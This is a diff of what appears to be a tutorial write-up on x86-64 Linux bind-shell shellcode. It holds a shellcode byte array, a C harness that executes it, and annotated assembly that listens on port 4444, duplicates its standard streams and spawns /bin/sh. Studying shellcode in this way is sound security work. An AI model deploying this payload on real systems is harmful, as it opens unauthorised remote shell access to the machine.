@@ -16,7 +16,7 @@ unsigned char shellcode[] =
 "\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
 "\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
 
-    (*(void(*)()) shellcode)();
+(*(void(*)()) shellcode)();
 
 ```
 
@@ -30,32 +30,33 @@ Compiled as usual:
 1. Create a socket
 
     ```
-    push   0x29
+    push   0x29  ; sys_socket
     pop    rax
-    cdq ; Clear rdx
-    push   0x2 # AF_INET
+    cdq    ; Clear rdx
+    push   0x2 ; AF_INET
     pop    rdi
-    push   0x1 # SOCK_STREAM
+    push   0x1 ; SOCK_STREAM
     pop    rsi
-    syscall SYS_SOCKET
-    xchg   rdi,rax
+    syscall 
+    xchg   rdi,rax ; save rax in rdi
     ```
 
 2.  Create a struct_sockaddr = sockaddr = {AF_INET; PORT; 0x0; 0x0} and bind the created socket
 
     ```
     push   rdx
-    mov    DWORD PTR [rsp],0x5c110002
-    mov    rsi,rsp
+    mov    DWORD PTR [rsp],0x5c110002 ; put port and AF_INET in the struct
+    mov    rsi,rsp ; rsi points to the struct
     push   0x10 ; Size of the struct
-    pop    rdx
+    pop    rdx ; rdx now contains the size of the struct
 
+    ; Bind
     push   0x31 ; SYS_BIND
     pop    rax
     syscall
     ```
 
-3. Make the socket listen
+3. Put the socket in listening mode
 
     ```
     push   0x32 ; SYS_LISTEN
@@ -70,39 +71,42 @@ Compiled as usual:
     push   0x2b ; SYS_ACCEPT
     pop    rax
     syscall
-    xchg   rdi,rax
+    xchg   rdi,rax ; put the new socket in rdi
     ```
     
 
-5. Dup2-loop
+5. Dup2-loop to duplicate the file descriptors (stdin, stdout, stderr)
 
     ```
     push   0x3 
     pop    rsi
-    dec    rsi ; start with stderr
-    push   0x21 ; dup2
+    dec    rsi ; start with stderr (2)
+    push   0x21 ; dup2 syscall
     pop    rax
     syscall
 
-    dec    rsi
-    push   0x21 ; dup2
-    pop    rax
-    syscall
+    loop:
+        dec    rsi
+        push   0x21 ; dup2
+        pop    rax
+        syscall
+        jne    loop
+
     ```
 
 6. Execve('/bin/sh', ['/bin/sh'], 0);
 
     ```
-    push   0x3b
+    push   0x3b ; execve syscall number
     pop    rax
-    cdq
-    movabs rbx,0x68732f6e69622f
+    cdq  ; clear rdx
+    movabs rbx,0x68732f6e69622f ; /bin/sh in hex
     push   rbx
-    mov    rdi,rsp
-    push   rdx
+    mov    rdi,rsp ; rdi points to /bin/sh on the stack
+    push   rdx ; put null on the stack
     push   rdx
     push   rdi
-    mov    rsi,rsp
+    mov    rsi,rsp ; rsi points to a pointer to /bin/sh to work as (argv **)
     syscall
 
     ```
